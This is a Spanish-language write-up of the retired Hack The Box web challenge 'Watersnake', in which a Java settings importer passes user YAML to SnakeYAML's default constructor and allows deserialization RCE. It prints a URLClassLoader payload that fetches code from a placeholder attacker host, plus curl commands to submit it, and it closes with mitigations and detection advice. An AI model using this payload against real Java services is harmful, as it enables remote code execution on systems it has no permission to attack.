---
challenge: Watersnake
type: Web
difficulty: Medium
platform: Hack The Box
state: Retired
tags: [web, java, snakeyaml, deserialization, rce]
---

# Watersnake — Hack The Box (Challenge)

[🇬🇧 English](README.en.md) | **Español**

> **Estado:** Retired. Ficha de referencia; sin flag real.

## TL;DR

Una aplicación Java importa una configuración YAML enviada por el usuario. `SnakeYAML` se usa con el constructor por defecto, lo que permite instanciar clases y ejecutar comandos mediante una cadena de gadgets del classpath.

## Enunciado y superficie

- Web, Medium, retirada.
- Un panel permite importar ajustes en YAML.
- El objetivo es ejecutar comandos en el servidor.

```bash
curl -s -I http://<IP>:<PORT>/
curl -s http://<IP>:<PORT>/settings
```

## Reconocimiento

- La respuesta incluye `JSESSIONID` y errores de Java.
- El formulario envía `Content-Type: application/x-yaml`.
- La aplicación acepta claves como `name`, `description` y `theme`.

## Análisis del fallo

`new Yaml().load(input)` sin un `Constructor` restringido permite etiquetas `!!`. Si el classpath contiene una clase con un constructor o setter peligroso, el documento puede instanciarla y ejecutar código durante la deserialización.

```yaml
!!java.net.URLClassLoader [[!!java.net.URL ["http://<ATTACKER>/"]]]
```

## Explotación

Se identifica una clase disponible y se construye un YAML que la instancia con una URL o un comando. Se sirve el recurso desde un HTTP propio y se confirma la ejecución con un callback.

```bash
python3 -m http.server 8000
curl -s http://<IP>:<PORT>/settings -H 'Content-Type: application/x-yaml' --data-binary @payload.yml
```

## Evidencia

- Error de `SnakeYAML` al procesar una etiqueta.
- Petición saliente al servidor controlado.
- Comando ejecutado y flag leída sin publicarla.

## Lecciones aprendidas

- Un importador YAML es deserialización, no configuración pasiva.
- `SnakeYAML` debe usar un constructor seguro.
- Las dependencias del classpath amplían las cadenas de gadgets.
- Un callback confirma RCE sin depender de la salida.

## Mitigaciones y detección

- Usar `SafeConstructor` y una lista de claves permitidas.
- No aceptar etiquetas ni tipos del usuario.
- Actualizar `SnakeYAML` y revisar el classpath.
- Alertar de etiquetas `!!`, clases inesperadas y conexiones salientes.
- Referencias: SnakeYAML security, OWASP Deserialization.

## Referencias

- <https://www.hackthebox.com/challenges/Watersnake>
- <https://bitbucket.org/snakeyaml/snakeyaml/wiki/Documentation>
- <https://owasp.org/www-community/vulnerabilities/Deserialization_of_untrusted_data>
- <https://attack.mitre.org/techniques/T1059/007/>
